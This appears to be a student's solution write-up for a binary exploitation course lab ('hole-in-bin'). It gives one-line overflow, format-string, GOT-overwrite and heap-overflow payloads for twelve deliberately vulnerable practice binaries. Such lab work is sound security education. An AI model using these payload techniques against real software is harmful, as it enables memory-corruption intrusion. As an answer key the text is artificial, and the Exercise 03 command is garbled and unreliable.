# Hole in bin

This exercise is designed to test skills and understanding of binary exploitation and reverse engineering. You will need to work through a series of binary exploitation challenges using a provided virtual machine.

Audit questions https://github.com/01-edu/public/blob/master/subjects/cybersecurity/hole-in-bin/audit/README.md

1. Download the virtual machine file `hole-in-bin.ova`. Install and launch the machine in VirtualBox.
   Username: user, Password: user
2. Access the specified address mentioned in the description: `/opt/hole-in-bin`
3. In the directory, there are 12 new folders - 12 exercises.

## Exercise 00: Buffer Overflow Basics

Tools: strings, objdump, gdb

Overview: The binary checks whether a variable is non-zero to print a success message. Because it uses gets without validating input size, a buffer overflow is possible.

Exploit:

Input:

`python3 -c 'print("A"*65)' | ./bin`

Result: The variable is changed, printing: you have changed the 'modified' variable.
[exercise00](img/00.png)

## Exercise 01: Controlled Variable Modification

Tools: strings, objdump

Overview: The program checks whether an input variable equals "abcd".

Exploit:

Input:

`./bin $(python3 -c 'print("A"*64 + "dcba")')`


Result: "you have correctly got the variable to the right value."
[exercise01](img/01.png)

## Exercise 02: Environment Variable Exploit

Tools: gdb, objdump, strings

Overview: The binary uses the GREENIE environment variable with a vulnerable strcpy.

Exploit:

Set `GREENIE`: `export GREENIE=$(python3 -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")')`


Run:`./bin`


Result: Success message appears.

[exercise02](img/02.png)

## Exercise 03: Function Pointer Overwrite

Tools: gdb, objdump, perl, strings

Overview: The program uses gets, allowing a function pointer to be overwritten.

Exploit:

Find the target function:

objdump -d ./bin | grep win


Address: 0x08048424

Input: `perl -e 'print "A"x64 . "\x24\x84\x04\x08"' | ./binpython3 -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./bin`


Result: Execution jumps to the win function.

[exercise03](img/03.png)
[exercise03_2](img/03_2.png)

## Exercise 04: Return Address Hijacking

Tools: objdump, gdb

Overview: The binary uses gets, allowing the return address to be overwritten to call a win function.

Exploit:

Address of win: 0x080483f4

Input: `python3 -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./bin`


Result: Success message appears.

[exercise04](img/04.png)

## Exercise 05: Overwriting Target Variable

Tools: objdump, strings

Overview: sprintf allows a buffer overflow to modify a target variable.

Exploit:

Address: 0xdeadbeef

Input: `./bin $(python3 -c 'print("A"*64 + "\xef\xbe\xad\xde")')`


Result: Prints success message.

[exercise05](img/05.png)

## Exercise 06: Debugging a Broken Binary

Issue: The binary doesn’t function as intended due to a bug.

Workaround: In gdb, jump to the win function manually:

    `gdb ./bin`
    `jump *0x08048864`

[exercise06](img/06.png)

## Exercise 07: Format String Exploit

Tools: objdump, strings, gdb

Overview: The program uses fgets and contains a format-string vulnerability that can modify a target variable.

Exploit:

Address: 0x080496e4

Input: `python3 -c 'print("\xe4\x96\x04\x08" + "%60x%4$n")' | ./bin`


Result: Success message appears.

[exercise07](img/07.png)

## Exercise 08: Advanced Format String Exploit

Tools: objdump, gdb

Overview: The binary has a target variable requiring a specific value (0x1025544).

Exploit:

Address: 0x080496f4

Optimized input:

    `bash`

    `python3 -c 'print("\xf4\x96\x04\x08" + "%16930112x%12$n")' | ./bin`


Result: Success message.

[exercise08](img/08.png)

## Exercise 09: Format String Exploit

Goal: Redirect the exit function to call hello.

Key Information

hello function address: 0x080484b4

exit function address: 0x08049724

Exploit Steps

Analyze the binary:

vuln reads input and uses printf with a format-string vulnerability. By crafting input, we can overwrite the exit entry in the GOT.

Create the payload:

Use %4$hn to write values at the desired memory locations.

Single word:


        `bash`

        `(python -c 'print("\x24\x97\x04\x08"+"%33968x%4$hn")') | ./bin`


Double word:

        `bash`

        `(python -c 'print("\x24\x97\x04\x08"+"\x26\x97\x04\x08"+"%33964x%4$hn"+"%33616x%5$hn")') | ./bin`


Result: Execution is redirected to hello.

[exercise9_5](img/09_5.png)

## Exercise 10: Buffer Overflow

Goal: Redirect execution to the winner function by overwriting a function pointer.

Key Information

Buffer size: 64 bytes

Function pointer offset: 72 bytes from the start of the buffer

winner function address: 0x08048464

Exploit Steps

Analyze the binary:
strcpy is used without bounds checking, allowing a buffer overflow that can overwrite the function pointer.

Create the payload:

Fill the buffer (72 bytes) and overwrite the function pointer:
    
    `bash`

    `./bin $(python -c 'print("A"*72+"\x64\x84\x04\x08")')`


Result: Execution is redirected to winner.

[exercise10](img/10.png)

## Exercise 11: Heap-Based Buffer Overflow

Goal: Redirect execution to winner by exploiting a heap overflow.

Key Information

winner function address: 0x08048494

The overflow targets a pointer in the heap, overwriting it with the address of winner.

Exploit Steps

Analyze the binary:
Heap chunks (8 bytes each) are allocated and manipulated. strcpy causes an overflow, allowing adjacent memory to be overwritten.

Create the payload:

Overflow the heap chunk and overwrite the target pointer:
    
    `bash`

    `./bin $(python -c 'print("A"*20+"\x74\x97\x04\x08"+" "+"\x94\x84\x04\x08")')`


Result: Execution is redirected to winner.

[exercise11](img/11.png)